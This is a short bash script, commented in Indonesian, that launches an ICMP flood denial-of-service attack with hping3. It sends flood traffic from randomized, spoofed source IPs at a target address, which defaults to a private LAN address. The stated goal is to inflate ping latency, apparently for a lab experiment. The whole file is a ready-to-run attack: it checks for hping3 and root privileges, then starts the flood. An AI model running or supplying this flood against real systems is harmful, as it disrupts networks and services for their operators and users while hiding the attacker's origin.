#!/bin/bash
# Serangan ICMP Flood menggunakan hping3
# Script ini mengirim ICMP flood dengan source IP random untuk mempengaruhi pengukuran latency ping
# 
# Penggunaan:
#   sudo ./attack_icmp.sh [TARGET_IP]
#   
# Jika TARGET_IP tidak diberikan, default adalah 192.168.18.20
# Tekan Ctrl+C untuk berhenti

# Default target IP
TARGET_IP="${1:-192.168.18.20}"

echo "=========================================="
echo "   ICMP FLOOD ATTACK"
echo "=========================================="
echo "Target: $TARGET_IP"
echo "Mode: ICMP flood dengan random source IP"
echo "Tujuan: Meningkatkan latency ping"
echo ""
echo "Tekan Ctrl+C untuk menghentikan serangan"
echo "=========================================="
echo ""

# Cek apakah hping3 terinstal
if ! command -v hping3 &> /dev/null; then
    echo "ERROR: hping3 tidak terinstal!"
    echo "Install dengan: sudo apt install hping3"
    exit 1
fi

# Cek apakah script dijalankan dengan sudo
if [ "$EUID" -ne 0 ]; then
    echo "ERROR: Script ini harus dijalankan dengan sudo"
    echo "Gunakan: sudo ./attack_icmp.sh"
    exit 1
fi

# Jalankan serangan
echo "Memulai ICMP flood..."
hping3 --icmp --flood --rand-source "$TARGET_IP"
